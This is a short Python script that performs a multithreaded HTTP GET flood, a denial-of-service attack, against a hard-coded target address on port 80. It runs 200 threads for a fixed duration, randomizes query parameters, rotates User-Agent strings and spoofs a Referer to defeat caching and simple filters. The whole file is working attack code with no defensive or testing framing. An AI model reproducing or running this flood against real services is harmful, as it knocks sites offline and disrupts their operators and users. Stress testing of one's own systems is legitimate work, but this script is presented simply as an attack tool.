import threading
import requests
import random
import string
import time

target_ip = "10.0.0.1"
target_port = 80
duration = 20  # seconds
num_threads = 200

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def flood():
    url = f"http://{target_ip}:{target_port}"
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            # Randomized GET parameters
            params = {random_string(): random_string() for _ in range(6)}
            headers = {
                "User-Agent": random.choice([
                    "Mozilla/5.0", "Chrome/90.0", "Safari/537.36", "Edge/85.0"
                ]),
                "Cache-Control": "no-cache",
                "Referer": "http://google.com"
            }
            requests.get(url, params=params, headers=headers, timeout=0.9)
        except:
            continue

threads = []
for _ in range(num_threads):
    t = threading.Thread(target=flood)
    t.daemon = True
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print("HTTP flood finished.")
